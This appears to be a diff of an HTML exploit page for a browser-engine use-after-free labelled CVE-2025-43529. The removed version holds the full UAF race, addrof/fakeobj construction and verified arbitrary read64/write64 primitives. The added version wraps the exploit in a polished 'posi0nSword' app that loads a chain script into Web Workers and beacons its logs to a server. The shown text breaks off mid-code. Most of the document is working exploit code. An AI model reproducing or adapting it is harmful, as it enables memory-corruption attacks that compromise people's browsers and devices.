@@ -1,497 +1,565 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>CVE-2025-43529 arbitrary ref / DS scribble testbench</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 16px; background: #101216; color: #e7e7e7; }
-        button { font-size: 16px; padding: 10px 14px; margin: 8px 0; }
-        #output-list { white-space: pre-wrap; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
-        .ok { color: #66ff99; }
-        .warn { color: #ffd36a; }
-        .fail { color: #ff7777; }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#f9f9f9">
+<title>posi0nSword</title>
+<style>
+  :root { --green: #3d9459; --hairline: rgba(60,60,67,.29); }
+  html, body { margin:0; padding:0; height:100%; background:#f2f2f7; overscroll-behavior:none; }
+  body { -webkit-font-smoothing:antialiased; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%;
+         font-family:-apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Roboto, sans-serif; }
+  a { color:var(--green); text-decoration:none; }
+  @keyframes f7fade { from { opacity:0; } to { opacity:1; } }
+  @keyframes f7spin { to { transform:rotate(360deg); } }
+  .app { position:relative; height:100dvh; overflow:hidden; display:flex; flex-direction:column; }
+
+  /* ---- top navbar ---- */
+  .navbar { flex:none; position:relative; z-index:20; background:rgba(249,249,250,.9);
+            backdrop-filter:saturate(180%) blur(20px); -webkit-backdrop-filter:saturate(180%) blur(20px);
+            box-shadow:0 .5px 0 var(--hairline); padding-top:env(safe-area-inset-top); }
+  .navbar .row { height:46px; display:flex; align-items:center; justify-content:space-between; padding:0 6px; position:relative; }
+  .navbtn { color:var(--green); font-size:17px; padding:0 12px; height:44px; display:flex; align-items:center;
+            background:none; border:none; cursor:pointer; user-select:none; }
+  .navbtn:active { opacity:.4; }
+  .navtitle { position:absolute; left:50%; transform:translateX(-50%); font-size:17px; font-weight:600; letter-spacing:-.02em; color:#000; }
+
+  /* ---- log console ---- */
+  #output-list { flex:1; overflow-y:auto; background:#191b1f; padding:12px 0; box-sizing:border-box;
+                 font-family:ui-monospace, 'SF Mono', SFMono-Regular, Menlo, Consolas, monospace;
+                 font-size:13px; line-height:1.65; color:#ced2d9; overscroll-behavior:contain; }
+  #output-list > div { padding:2px 16px; white-space:pre-wrap; word-break:break-word; }
+  #output-list .fail { color:#d98d84; }
+  #output-list .warn { color:#d8b573; }
+  #output-list::-webkit-scrollbar { width:8px; }
+  #output-list::-webkit-scrollbar-thumb { background:rgba(255,255,255,.12); border-radius:4px; }
+
+  /* ---- bottom toolbar ---- */
+  .toolbar { flex:none; z-index:20; background:rgba(249,249,250,.9);
+             backdrop-filter:saturate(180%) blur(20px); -webkit-backdrop-filter:saturate(180%) blur(20px);
+             box-shadow:0 -.5px 0 var(--hairline); padding-bottom:env(safe-area-inset-bottom); }
+  .toolbar .row { height:50px; display:flex; align-items:center; max-width:560px; margin:0 auto; padding:0 6px; }
+  .toolbar .side { flex:1; display:flex; align-items:center; }
+  .toolbar .side.right { justify-content:flex-end; }
+  .iconbtn { width:44px; height:44px; display:flex; align-items:center; justify-content:center;
+             background:none; border:none; cursor:pointer; user-select:none; padding:0; }
+  .iconbtn:active { opacity:.4; }
+  .iconbtn[disabled] { opacity:.35; pointer-events:none; }
+  .iconbtn svg { fill:var(--green); }
+  .center { flex:none; min-width:120px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:3px; }
+  #statuswrap { display:flex; align-items:center; gap:5px; font-size:12.5px; font-weight:600; color:#1c1c1e; line-height:1; }
+  #spin { width:12px; height:12px; display:none; }
+  #spin.on { display:block; animation:f7spin .8s steps(8,end) infinite; }
+
+  /* ---- modal (about/credits) ---- */
+  .overlay { position:fixed; inset:0; z-index:100; display:none; align-items:flex-end; justify-content:center;
+             background:rgba(0,0,0,.25); animation:f7fade .25s; }
+  .overlay[data-open="true"] { display:flex; }
+  .modal { background:#f2f2f7; border-radius:14px 14px 0 0; width:min(560px,100%); max-height:70%;
+           overflow-y:auto; padding:18px 18px calc(18px + env(safe-area-inset-bottom)); box-sizing:border-box; }
+  .modal h2 { font-size:20px; margin:0 0 10px; color:#000; }
+  .modal p { font-size:15px; line-height:1.55; color:#3c3c43; margin:0 0 10px; }
+  .modal .muted { color:#8e8e93; font-size:13px; }
+  .modal .row { display:flex; justify-content:space-between; gap:12px; padding:9px 0; border-bottom:.5px solid var(--hairline); font-size:14.5px; color:#1c1c1e; }
+  .modal .row .v { color:#8e8e93; text-align:right; }
+  .modal .close { display:block; margin:12px auto 0; padding:9px 26px; border:none; border-radius:11px;
+                  background:#fff; color:var(--green); font-size:16px; font-weight:600; cursor:pointer; }
+
+  /* ---- settings sheet ---- */
+  #sheetBackdrop { position:fixed; inset:0; z-index:240; background:rgba(0,0,0,.25); display:none; animation:f7fade .3s; }
+  #sheetBackdrop.on { display:block; }
+  #settingsSheet { position:fixed; left:0; right:0; bottom:0; z-index:250; transform:translateY(105%);
+                   transition:transform .34s cubic-bezier(.32,.72,0,1); pointer-events:none; }
+  #settingsSheet.on { transform:translateY(0); }
+  #settingsSheet .card { max-width:560px; margin:0 auto; background:#f2f2f7; border-radius:14px 14px 0 0;
+                         pointer-events:auto; padding-bottom:calc(10px + env(safe-area-inset-bottom,0px)); }
+  #settingsSheet .grab { width:36px; height:5px; border-radius:3px; background:rgba(60,60,67,.3); margin:8px auto 0; }
+  #settingsSheet .head { display:flex; align-items:center; justify-content:space-between; padding:10px 16px 6px; }
+  #settingsSheet .head b { font-size:20px; color:#000; }
+  #settingsSheet .done { color:var(--green); font-size:17px; font-weight:600; padding:6px 4px; cursor:pointer; background:none; border:none; }
+  #settingsSheet .group { background:#fff; border-radius:12px; overflow:hidden; margin:6px 16px 0; }
+  .togglerow { display:flex; align-items:center; gap:12px; padding:10px 16px; cursor:pointer; user-select:none; }
+  .togglerow + .togglerow { border-top:.5px solid var(--hairline); }
+  .togglerow .txt { flex:1; min-width:0; }
+  .togglerow .txt b { display:block; font-size:17px; font-weight:400; color:#000; }
+  .togglerow .txt span { font-size:13px; color:rgba(60,60,67,.6); }
+  .tswitch { width:51px; height:31px; border-radius:16px; flex:none; background:#e9e9ea; transition:background .25s; position:relative; }
+  .tswitch.on { background:var(--green); }
+  .tswitch i { position:absolute; top:2px; left:2px; width:27px; height:27px; border-radius:50%; background:#fff;
+               box-shadow:0 3px 8px rgba(0,0,0,.12), 0 1px 1px rgba(0,0,0,.12); transition:transform .25s cubic-bezier(.25,.8,.4,1.15); }
+  .tswitch.on i { transform:translateX(20px); }
+</style>
 </head>
 <body>
-<h3>CVE-2025-43529 arbitrary ref / DS scribble testbench</h3>
-<button id="runner" onclick="init()">Run now</button>
-<div id="status">Idle</div>
-<div id="output-list"></div>
+<div class="app">
+  <div class="navbar">
+    <div class="row">
+      <button class="navbtn" id="aboutBtn">About</button>
+      <div class="navtitle">posi0nSword</div>
+      <button class="navbtn" id="creditsBtn">Credits</button>
+    </div>
+  </div>
+
+  <div id="output-list"></div>
+
+  <div class="toolbar">
+    <div class="row">
+      <div class="side">
+        <button class="iconbtn" onclick="init()" id="runBtn" title="run">
+          <svg width="25" height="25" viewBox="0 0 28 28"><path d="M9.3 5.7c0-1.5 1.6-2.4 2.9-1.6l12.1 7.3c1.2.7 1.2 2.5 0 3.2l-12.1 7.3c-1.3.8-2.9-.1-2.9-1.6z"></path></svg>
+        </button>
+        <button class="iconbtn" id="clearBtn" title="clear">
+          <svg width="23" height="23" viewBox="0 0 28 28"><path d="M10.7 5.9v-1.2c0-1.8 1.5-3.2 3.3-3.2s3.3 1.4 3.3 3.2v1.2h-2.4v-1.1c0-.5-.4-.9-.9-.9s-.9.4-.9.9v1.1z"></path><rect x="3.6" y="5.9" width="20.8" height="3" rx="1.5"></rect><path fill-rule="evenodd" d="M5.8 10.8h16.4l-1 12c-.15 1.8-1.65 3.2-3.45 3.2h-7.5c-1.8 0-3.3-1.4-3.45-3.2zm3.75 3.9a.95.95 0 0 1 1.9 0v6.2a.95.95 0 0 1-1.9 0zm3.55 0a.95.95 0 0 1 1.9 0v6.2a.95.95 0 0 1-1.9 0zm3.55 0a.95.95 0 0 1 1.9 0v6.2a.95.95 0 0 1-1.9 0z"></path></svg>
+        </button>
+      </div>
+      <div class="center">
+        <div id="statuswrap">
+          <svg id="spin" width="12" height="12" viewBox="0 0 28 28"><g fill="#8e8e93"><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".85" transform="rotate(45 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".7" transform="rotate(90 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".6" transform="rotate(135 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".5" transform="rotate(180 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".4" transform="rotate(225 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".3" transform="rotate(270 14 14)"></rect><rect x="12.7" y="2.4" width="2.6" height="7" rx="1.3" opacity=".2" transform="rotate(315 14 14)"></rect></g></svg>
+          <span id="status">ready</span>
+        </div>
+      </div>
+      <div class="side right">
+        <button class="iconbtn" id="settingsBtn" title="settings">
+          <svg width="23" height="23" viewBox="0 0 28 28"><defs><mask id="f7gear"><rect width="28" height="28" fill="#fff"></rect><circle cx="14" cy="14" r="3.6" fill="#000"></circle></mask></defs><g mask="url(#f7gear)"><rect x="11.4" y="1.8" width="5.2" height="24.4" rx="2.6"></rect><rect x="11.4" y="1.8" width="5.2" height="24.4" rx="2.6" transform="rotate(45 14 14)"></rect><rect x="11.4" y="1.8" width="5.2" height="24.4" rx="2.6" transform="rotate(90 14 14)"></rect><rect x="11.4" y="1.8" width="5.2" height="24.4" rx="2.6" transform="rotate(135 14 14)"></rect><circle cx="14" cy="14" r="9"></circle></g></svg>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Modal (About / Credits) -->
+<div class="overlay" id="overlay">
+  <div class="modal" id="modal">
+    <h2 id="modalTitle"></h2>
+    <div id="modalBody"></div>
+    <button class="close" id="modalClose">Done</button>
+  </div>
+</div>
+
+<!-- Settings sheet -->
+<div id="sheetBackdrop"></div>
+<div id="settingsSheet">
+  <div class="card">
+    <div class="grab"></div>
+    <div class="head"><b>Settings</b><button class="done" id="settingsDone">Done</button></div>
+    <div class="group">
+      <div class="togglerow" data-k="f7Timestamps">
+        <div class="txt"><b>Timestamps</b><span>Prefix each line with the time</span></div>
+        <div class="tswitch on" id="swTs"><i></i></div>
+      </div>
+      <div class="togglerow" data-k="f7AutoScroll">
+        <div class="txt"><b>Auto-scroll</b><span>Follow the newest output</span></div>
+        <div class="tswitch on" id="swAs"><i></i></div>
+      </div>
+      <div class="togglerow" data-k="f7Verbose">
+        <div class="txt"><b>Verbose</b><span>Show thread-dump lines</span></div>
+        <div class="tswitch on" id="swVb"><i></i></div>
+      </div>
+    </div>
+  </div>
+</div>
 
 <script>
-"use strict";
-
-window.onerror = function(message, source, lineno, colno, error) {
+// UI layer: toggles + sheet + status spinner (independent of the harness below)
+(function () {
+    const defs = { f7Timestamps: true, f7AutoScroll: true, f7Verbose: true };
     try {
-        log(`JS ERROR line ${lineno}: ${message}`, "fail");
-        setStatus("script error");
-    } catch (_) {
-        const out = document.getElementById("output-list");
-        if (out) out.textContent += `JS ERROR line ${lineno}: ${message}\n`;
-    }
-    console.error("JS ERROR", message, source, lineno, colno, error);
-    return true;
-};
-
-const convBuf = new ArrayBuffer(8);
-const u8 = new Uint8Array(convBuf);
-const u32 = new Uint32Array(convBuf);
-const u64 = new BigUint64Array(convBuf);
-const f64 = new Float64Array(convBuf);
-
-function itof(value) {
-    u64[0] = BigInt.asUintN(64, value);
-    return f64[0];
-}
-
-function ftoi(value) {
-    f64[0] = value;
-    return u64[0];
-}
-
-function hex(value) {
-    if (typeof value !== "bigint") return String(value);
-    return "0x" + value.toString(16);
-}
-
-function noPAC(value) {
-    return value & 0xffffffffffn;
-}
-
-function bigintFromBytes(bytes) {
-    for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
-    return u64[0];
-}
-
-function beacon(kind, message) {
-    try {
-        const img = new Image();
-        img.src = `/log?kind=${encodeURIComponent(kind)}&msg=${encodeURIComponent(String(message).slice(0, 300))}&t=${Date.now()}`;
-    } catch (_) {}
-}
-
-function log(output, cls) {
-    beacon(cls || "log", output);
-    const addline = document.createElement("div");
-    if (cls) addline.className = cls;
-    addline.textContent = `[${new Date().toISOString().split("T")[1].split(".")[0]}] ${output}`;
-    document.getElementById("output-list").appendChild(addline);
-    addline.scrollIntoView();
-    console.log(output);
-}
-
-function setStatus(s) {
-    beacon("status", s);
-    document.getElementById("status").textContent = s;
-    console.log("[status]", s);
-}
-
-function signed32(v) {
-    v &= 0xffffffffn;
-    if (v >= 0x80000000n) return Number(v - 0x100000000n);
-    return Number(v);
-}
-
-function plausiblePointer(p) {
-    return typeof p === "bigint" &&
-        p >= 0x100000000n &&
-        p < 0x0001000000000000n &&
-        (p & 0x7n) === 0n;
-}
-
-function buildDSScribblePrimitives(addrof, fakeobj) {
-    const report = {
-        ok: false,
-        stage: "init",
-        reason: "",
-        attempts: 0,
-        scribbleAddr: 0n,
-        vectorRaw: 0n,
-        backingPtr: 0n,
-        secondaryBackingPtr: 0n,
-        proofs: 0,
-    };
-
-    let read64;
-    let write64;
-    const keepAlive = [];
-    const read64BigUint64 = new BigUint64Array(4);
-    const read64Str = "\u4444".repeat(0x10);
-    void [][read64Str];
-
-    report.stage = "find-0x20-adjacent-jsobject";
-    let scribbleElement = null;
-    let prevAddr = 0n;
-    for (let i = 0; i < 1000; ++i) {
-        const o = { p1: 1.1, p2: 2.2 };
-        const addr = addrof(o);
-        report.attempts = i + 1;
-        if (addr - prevAddr === 0x20n) {
-            scribbleElement = o;
-            report.scribbleAddr = addr;
-            break;
-        }
-        keepAlive.push(o);
-        prevAddr = addr;
-    }
-    if (!scribbleElement) {
-        report.reason = "could not find adjacent 0x20 JSObject allocation";
-        return { ok: false, report };
-    }
-
-    let changeScribbleHolder;
-    let changeScribble;
-    let originalCell;
-
-    try {
-        report.stage = "build-change-scribble";
-        // Do not log or touch this fake object. It is a placeholder JSValue,
-        // immediately replaced after harvesting a valid DoubleArray cell.
-        changeScribbleHolder = {
-            p1: fakeobj(0x108240700000000n),
-            p2: scribbleElement
-        };
-        changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);
-
-        scribbleElement.p3 = 1.1;
-        scribbleElement[0] = 1.1;
-
-        const doubleArrayCell = ftoi(changeScribble[0]);
-        changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
-        originalCell = changeScribble[0];
-    } catch (e) {
-        report.reason = `change scribble failed: ${e.message}`;
-        return { ok: false, report };
-    }
-
-    write64 = function(addr, value) {
-        addr = BigInt.asUintN(64, addr);
-        value = BigInt.asUintN(64, value);
-
-        changeScribble[0] = originalCell;
-        changeScribble[1] = itof(addr + 0x10n);
-
-        if (value === 0n) {
-            scribbleElement.p3 = 1;
-            delete scribbleElement.p3;
-        } else if (value < 0x2000000000000n) {
-            scribbleElement.p3 = fakeobj(value);
-        } else if (value <= 0x7ff2000000000000n ||
-                   (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
-            scribbleElement.p3 = itof(value - 0x2000000000000n);
-        } else {
-            const offAddr = addr + 8n;
-            const offVal = read64(offAddr);
-            const lo = signed32(value);
-            const hi = signed32(value >> 32n);
-            scribbleElement.p3 = lo;
-            changeScribble[1] = itof(addr + 0x14n);
-            scribbleElement.p3 = hi;
-            write64(offAddr, offVal);
-        }
-    };
-
-    try {
-        report.stage = "build-read64-string-window";
-        changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
-        const read64Float64Bytes = ftoi(scribbleElement[1]);
-        read64BigUint64[0] = 0x10000000006n;
-        read64BigUint64[1] = read64Float64Bytes + 0x10n;
-
-        changeScribble[1] = itof(addrof(read64Str) + 8n);
-        scribbleElement[0] = itof(read64Float64Bytes);
-
-        read64 = function(addr) {
-            read64BigUint64[1] = BigInt.asUintN(64, addr);
-            return BigInt(read64Str.charCodeAt(0)) |
-                   (BigInt(read64Str.charCodeAt(1)) << 16n) |
-                   (BigInt(read64Str.charCodeAt(2)) << 32n) |
-                   (BigInt(read64Str.charCodeAt(3)) << 48n);
-        };
-    } catch (e) {
-        report.reason = `read64 setup failed: ${e.message}`;
-        return { ok: false, report };
-    }
-
-    try {
-        report.stage = "prove-typed-array-backing-store";
-        const proofKeepAlive = [];
-
-        function proveBackingStore(label, seed) {
-            const proofBuffer = new ArrayBuffer(0x180);
-            const proofView = new DataView(proofBuffer);
-            const proofU8 = new Uint8Array(proofBuffer);
-            proofKeepAlive.push({ proofBuffer, proofView, proofU8 });
-
-            const markerA = 0x1122334455667788n ^ (BigInt(seed) << 8n);
-            const markerB = 0x8877665544332211n ^ (BigInt(seed) << 16n);
-            const directWriteMarker = 0x0102030405060708n ^ (BigInt(seed) << 24n);
-            // Deliberately in the JS NaN-boxing gap so write64 must take its
-            // split int32 path, not only the easy double-immediate path.
-            const splitWriteMarker = 0x7ff80000cafebeefn + BigInt(seed);
-
-            // Normal JS writes first; the primitive must independently read
-            // both offsets from the candidate backing store.
-            proofView.setBigUint64(0x00, markerA, true);
-            proofView.setBigUint64(0x40, markerB, true);
-
-            const vectorRaw = read64(addrof(proofU8) + 0x10n);
-            if (label === "primary") report.vectorRaw = vectorRaw;
-
-            const candidates = [];
-            function addCandidate(p) {
-                if (plausiblePointer(p) && !candidates.includes(p)) candidates.push(p);
-            }
-            addCandidate(vectorRaw);
-            addCandidate(noPAC(vectorRaw));
-
-            for (const candidate of candidates) {
-                const readA = read64(candidate);
-                const readB = read64(candidate + 0x40n);
-                if (readA !== markerA || readB !== markerB) continue;
-
-                const old8 = proofView.getBigUint64(0x08, true);
-                const old48 = proofView.getBigUint64(0x48, true);
-
-                write64(candidate + 0x08n, directWriteMarker);
-                const normalSawDirect = proofView.getBigUint64(0x08, true);
-                const primitiveSawDirect = read64(candidate + 0x08n);
-
-                write64(candidate + 0x48n, splitWriteMarker);
-                const normalSawSplit = proofView.getBigUint64(0x48, true);
-                const primitiveSawSplit = read64(candidate + 0x48n);
-
-                write64(candidate + 0x08n, old8);
-                write64(candidate + 0x48n, old48);
-
-                if (normalSawDirect === directWriteMarker &&
-                    primitiveSawDirect === directWriteMarker &&
-                    normalSawSplit === splitWriteMarker &&
-                    primitiveSawSplit === splitWriteMarker) {
-                    return { backingPtr: candidate, vectorRaw };
-                }
-            }
-
-            return null;
-        }
-
-        const primaryProof = proveBackingStore("primary", 1);
-        if (!primaryProof) {
-            report.reason = `primary typed-array backing-store proof failed; vectorRaw=${hex(report.vectorRaw)}`;
-            return { ok: false, report, read64, write64 };
-        }
-
-        const secondaryProof = proveBackingStore("secondary", 2);
-        if (!secondaryProof) {
-            report.reason = `secondary typed-array backing-store proof failed after primary=${hex(primaryProof.backingPtr)}`;
-            return { ok: false, report, read64, write64 };
-        }
-
-        report.ok = true;
-        report.stage = "verified";
-        report.backingPtr = primaryProof.backingPtr;
-        report.secondaryBackingPtr = secondaryProof.backingPtr;
-        report.proofs = 2;
-        return {
-            ok: true,
-            report,
-            read64,
-            write64,
-            keepAlive: {
-                keepAlive,
-                read64BigUint64,
-                read64Str,
-                scribbleElement,
-                changeScribbleHolder,
-                changeScribble,
-                proofKeepAlive
-            }
-        };
-    } catch (e) {
-        report.reason = `backing-store proof failed: ${e.message}`;
-        return { ok: false, report, read64, write64 };
-    }
-}
-
-async function init() {
-    const runner = document.getElementById("runner");
-    if (window.__cve43529Running) return;
-    window.__cve43529Running = true;
-    runner.disabled = true;
-    document.getElementById("output-list").textContent = "";
-    setStatus("running");
-
-    log("Stage 1: CVE-2025-43529 UAF trigger");
-
-    const rootArray = new Array(0x40_0000).fill(1.1);
-    const rootIndex = rootArray.length - 1;
-    const reclaimed = [];
-
-    function triggerUAF(flag, k, allocCount) {
-        const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-        rootArray[rootIndex] = A;
-
-        const forGC = [];
-        const a = new Date(1111);
-        a[0] = 1.1;
-
-        for (let j = 0; j < allocCount; ++j) {
-            forGC.push(new ArrayBuffer(0x80_0000));
-        }
-
-        A.p2 = forGC;
-        const b = { p0: 0x42424242, p1: 1.1 };
-
-        let f = b;
-        if (flag) f = 1.1;
-
-        A.p1 = f;
-
-        let v = 1.1;
-        for (let i = 0; i < 1e6; ++i) {
-            for (let j = 0; j < k; ++j) {
-                v = i;
-                v = j;
-            }
-        }
-
-        b.p0 = v;
-        b.p1 = a;
-    }
-
-    function recursive(n) {
-        if (n === 0) return;
-        recursive((n | 0) - 1);
-    }
-
-    function safeRecursive(n) {
-        try { recursive(n); } catch (e) {}
-    }
-
-    triggerUAF(true, 1, 1);
-    triggerUAF(false, 1, 1);
-
-    for (let i = 0; i < 1000; ++i) {
-        triggerUAF(false, 0, 0);
-    }
-
-    for (let i = 0; i < 20; ++i) {
-        safeRecursive(800);
-    }
-
-    let success = false;
-    let lastProgress = Date.now();
-
-    for (let k = 0; k < 15000; ++k) {
-        triggerUAF(false, 10, (k % 5) + 1);
-        safeRecursive(800);
-
-        for (let i = 0; i < 3; ++i) {
-            new ArrayBuffer(0x4000);
-        }
-
-        let freed;
-        try {
-            freed = rootArray[rootIndex].p1.p1;
-        } catch (e) {
-            continue;
-        }
-
-        let winningArray = null;
-        const noCow = 13.37;
-        for (let i = 0; i < 64; ++i) {
-            const spray = [13.37, 2.2, 3.3, 4.4, noCow];
-            reclaimed.push(spray);
+        const saved = JSON.parse(localStorage.getItem("f7ui") || "{}");
+        for (const k in defs) window[k] = (k in saved) ? !!saved[k] : defs[k];
+    } catch (_) { for (const k in defs) window[k] = defs[k]; }
+    function persist() { try { localStorage.setItem("f7ui", JSON.stringify({ f7Timestamps: window.f7Timestamps, f7AutoScroll: window.f7AutoScroll, f7Verbose: window.f7Verbose })); } catch (_) { } }
+    const sw = { f7Timestamps: "swTs", f7AutoScroll: "swAs", f7Verbose: "swVb" };
+    for (const k in sw) document.getElementById(sw[k]).classList.toggle("on", !!window[k]);
+    document.querySelectorAll(".togglerow").forEach(row => {
+        row.addEventListener("click", () => {
+            const k = row.dataset.k;
+            window[k] = !window[k];
+            document.getElementById(sw[k]).classList.toggle("on", !!window[k]);
+            persist();
+        });
+    });
+    const sheet = document.getElementById("settingsSheet"), bd = document.getElementById("sheetBackdrop");
+    const openSheet = () => { sheet.classList.add("on"); bd.classList.add("on"); };
+    const closeSheet = () => { sheet.classList.remove("on"); bd.classList.remove("on"); };
+    document.getElementById("settingsBtn").addEventListener("click", openSheet);
+    document.getElementById("settingsDone").addEventListener("click", closeSheet);
+    bd.addEventListener("click", closeSheet);
+    document.getElementById("clearBtn").addEventListener("click", () => {
+        document.getElementById("output-list").textContent = "";
+    });
+    // status spinner: on while the status text mentions running
+    const spin = document.getElementById("spin");
+    new MutationObserver(() => {
+        const s = document.getElementById("status").textContent.toLowerCase();
+        spin.classList.toggle("on", /running|loading|spawning|stage|wake|spin/.test(s));
+    }).observe(document.getElementById("status"), { childList: true, characterData: true, subtree: true });
+})();
+</script>
+<script>
+        window.onerror = function (message, source, lineno, colno, error) {
             try {
-                if (freed[0] === 13.37) {
-                    winningArray = spray;
-                    break;
-                }
-            } catch (e) {}
-        }
-
-        if (!winningArray) {
-            if ((Date.now() - lastProgress) > 1500) {
-                log(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`, "warn");
-                setStatus(`racing ${k}/15000`);
-                lastProgress = Date.now();
-                await new Promise(r => setTimeout(r, 1));
+                log(`JS ERROR line ${lineno}: ${message}`, "fail");
+                setStatus("script error");
+            } catch (_) {
+                const out = document.getElementById("output-list");
+                if (out) out.textContent += `JS ERROR line ${lineno}: ${message}\n`;
             }
-            continue;
-        }
-
-        success = true;
-
-        // Critical primitive setup. Avoid DOM logging until addrof/fakeobj and
-        // the DS scribble proof have finished.
-        const boxedArray = winningArray;
-        boxedArray[0] = {};
-        const unboxedArray = freed;
-
-        function addrof(obj) {
-            boxedArray[0] = obj;
-            return ftoi(unboxedArray[0]);
-        }
-
-        function fakeobj(addr) {
-            unboxedArray[0] = itof(addr);
-            return boxedArray[0];
-        }
-
-        const addrBoxed = addrof(boxedArray);
-        const addrRoot = addrof(rootArray);
-        const fakeSelf = fakeobj(addrBoxed);
-
-        const ds = buildDSScribblePrimitives(addrof, fakeobj);
-
-        window.lastExploitState = {
-            addrof,
-            fakeobj,
-            boxedArray,
-            unboxedArray,
-            rootArray,
-            reclaimed,
-            ds
+            console.error("JS ERROR", message, source, lineno, colno, error);
+            return true;
         };
-        if (ds.ok) {
-            window.lastExploitState.read64 = ds.read64;
-            window.lastExploitState.write64 = ds.write64;
-            window.lastExploitState.keepAlive = ds.keepAlive;
+        function beacon(kind, message) {
+            try {
+                const img = new Image();
+                img.src = `/log?kind=${encodeURIComponent(kind)}&msg=${encodeURIComponent(String(message).slice(0, 300))}&t=${Date.now()}`;
+            } catch (_) { }
         }
 
-        log(`UAF won at attempt ${k}; reclaimed arrays=${reclaimed.length}`, "ok");
-        log(`addrof(boxedArray)=${hex(addrBoxed)}`, "ok");
-        log(`addrof(rootArray)=${hex(addrRoot)}`, "ok");
-        log(`fakeobj(addrof(boxedArray)) self type=${Object.prototype.toString.call(fakeSelf)}`, "ok");
-
-        log(`DS scribble stage=${ds.report.stage}`, ds.ok ? "ok" : "fail");
-        log(`DS scribble attempts=${ds.report.attempts}; scribble=${hex(ds.report.scribbleAddr)}`, ds.ok ? "ok" : "warn");
-        if (ds.report.vectorRaw) log(`typed-array vector raw=${hex(ds.report.vectorRaw)}`, ds.ok ? "ok" : "warn");
-
-        if (ds.ok) {
-            log(`DS scribble read64/write64 VERIFIED; proofs=${ds.report.proofs}; backing=${hex(ds.report.backingPtr)}; secondary=${hex(ds.report.secondaryBackingPtr)}`, "ok");
-            setStatus("verified WebContent read64/write64");
-        } else {
-            log(`DS scribble failed: ${ds.report.reason}`, "fail");
-            setStatus("addrof/fakeobj only; DS R/W not verified");
+        function log(output, cls) {
+            beacon(cls || "log", output);
+            if (window.__f7Verbose === false && String(output).startsWith("[dump thread]")) return;
+            const addline = document.createElement("div");
+            if (cls) addline.className = cls;
+            const ts = `[${new Date().toISOString().split("T")[1].split(".")[0]}] `;
+            addline.textContent = (window.__f7Timestamps === false ? "" : ts) + output;
+            document.getElementById("output-list").appendChild(addline);
+            if (window.__f7AutoScroll !== false) addline.scrollIntoView();
+            console.log(output);
         }
+
+        function setStatus(s) {
+            beacon("status", s);
+            document.getElementById("status").textContent = s;
+            console.log("[status]", s);
+        }
+
+
+        async function init() {
+            const runner = document.getElementById("runBtn");
+            if (window.__cve43529Running) return;
+            window.__cve43529Running = true;
+            runner.disabled = true;
+            document.getElementById("output-list").textContent = "";
+            setStatus("running");
+            log("Loading chain from Web Worker.");
+            log("Stage 1: CVE-2025-43529 UAF trigger");
+            //bug fix: Webcore::Script ExecutionContext::didLoadResourceSynchronously
+            //isn't set by the webworker during stage 1, unless we do an xhr request first with async disabled
+            function getJS(fname, method = 'GET') {
+                try {
+                    url = fname;
+                    //(`trying to fetch ${method} from: ${url}`);
+                    let xhr = new XMLHttpRequest();
+                    xhr.open("GET", `${url}`, false);
+                    //                          ^ (async disabled)
+                    xhr.send(null);
+                    return xhr.responseText;
+                }
+                catch (e) {
+                    // print("got error in getJS: " + e);
+                }
+            }
+            const signal = new Uint8Array(8);
+            const dlopen_worker = `(() => {
+  self.onmessage = function (e) {
+    const {
+      type,
+      data
+    } = e.data;
+    switch (type) {
+      case 'init':
+        const canvas = new OffscreenCanvas(64, 64);
+        const cx = canvas.getContext('2d', { willReadFrequently: true });
+        cx.fillStyle = '#f00';
+        cx.fillRect(0, 0, 64, 64);
+        globalThis[0] = data;
+        createImageBitmap(canvas).then(bitmap => {
+          globalThis[1] = bitmap;
+          self.postMessage(null);
+        });
+        break;
+      case 'dlopen':
+        self.postMessage('close() ENTER');
+        globalThis[1].close();
+        self.postMessage('close() RETURNED -- no park (dlopen did not block)');
         break;
     }
+  };
+})();`;
 
-    if (!success) {
-        log("Stage 1 failed: race not won after max attempts", "fail");
-        setStatus("failed to win UAF race");
+            function main() {
+                const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript' });
+                const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
+                let workerCode = "";
+                // inject the server origin so the worker's synchronous slog() can reach /log
+                workerCode = "self.__SLOG_ORIGIN=" + JSON.stringify(location.origin) + ";\n" + getJS(`do_chain.js`);
+                let workerBlob = new Blob([workerCode], { type: 'text/javascript' });
+                let workerBlobUrl = URL.createObjectURL(workerBlob);
+
+                const worker = new Worker(workerBlobUrl);
+
+                worker.onerror = function (e) {
+                    try { log("Worker syntax/load error: " + (e.message || e.toString()), "fail"); } catch (_) { }
+                    console.error("Worker error", e);
+                };
+                // --- dedicated poller: same chain script, stage1 only, then idles with live R/W ---
+const poller = new Worker(workerBlobUrl);
+poller.onerror = worker.onerror;
+let pollerReady = false;
+poller.onmessage = function (e) {
+    const m = e.data;
+    if (m === 'poll_ready') { worker.postMessage({ type: 'poll_ready' }); return; }
